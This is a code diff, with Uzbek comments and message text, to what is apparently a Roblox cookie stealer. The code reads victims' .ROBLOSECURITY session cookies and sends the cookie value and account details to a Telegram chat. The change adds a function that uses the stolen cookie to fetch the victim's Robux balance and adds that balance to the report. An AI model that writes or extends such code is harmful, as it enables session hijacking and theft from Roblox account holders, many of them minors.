@@ -26,6 +26,9 @@ async function checkAndSendCookies() {
         const userInfo = await getRobloxUserInfo(cookieValue);
         if (!userInfo) return;
 
+        // Robux balansini olish
+        let robuxBalance = await getRobuxBalance(cookieValue);
+
         let accountId = userInfo.id.toString();
         let currentTime = new Date().toLocaleString();
 
@@ -35,7 +38,7 @@ async function checkAndSendCookies() {
 
             if (!accData) {
                 let updateCount = 1;
-                let msgId = await sendTelegramMessage(userInfo, cookieValue, updateCount, currentTime, accountId);
+                let msgId = await sendTelegramMessage(userInfo, robuxBalance, cookieValue, updateCount, currentTime, accountId);
                 
                 if (msgId) {
                     trackedAccounts[accountId] = {
@@ -53,7 +56,7 @@ async function checkAndSendCookies() {
                         await deleteTelegramMessage(accData.messageId);
                     }
 
-                    let msgId = await sendTelegramMessage(userInfo, cookieValue, updateCount, currentTime, accountId);
+                    let msgId = await sendTelegramMessage(userInfo, robuxBalance, cookieValue, updateCount, currentTime, accountId);
 
                     if (msgId) {
                         trackedAccounts[accountId] = {
@@ -82,11 +85,26 @@ async function getRobloxUserInfo(cookieValue) {
     return null;
 }
 
-async function sendTelegramMessage(userInfo, cookieValue, updateCount, timeStr, accountId) {
+// Robux balansini olib keluvchi yangi funksiya
+async function getRobuxBalance(cookieValue) {
+    try {
+        let response = await fetch("https://economy.roblox.com/v1/user/currency", {
+            headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` }
+        });
+        if (response.ok) {
+            let data = await response.json();
+            return data.robux !== undefined ? data.robux : 0;
+        }
+    } catch (e) {}
+    return "Aniqlanmadi";
+}
+
+async function sendTelegramMessage(userInfo, robuxBalance, cookieValue, updateCount, timeStr, accountId) {
     let messageText = `🔄 **ROBLOX COOKIE YANGILANDI**\n\n` +
                       `👤 **Username:** \`${userInfo.name}\`\n` +
                       `🏷 **Displayname:** \`${userInfo.displayName}\`\n` +
                       `🆔 **ID:** \`${userInfo.id}\`\n` +
+                      `💎 **Robux Balansi:** \`${robuxBalance}\`\n` +
                       `📊 **Almashish soni:** \`${updateCount}-chi marta\`\n` +
                       `🕒 **Vaqt:** \`${timeStr}\``;
 
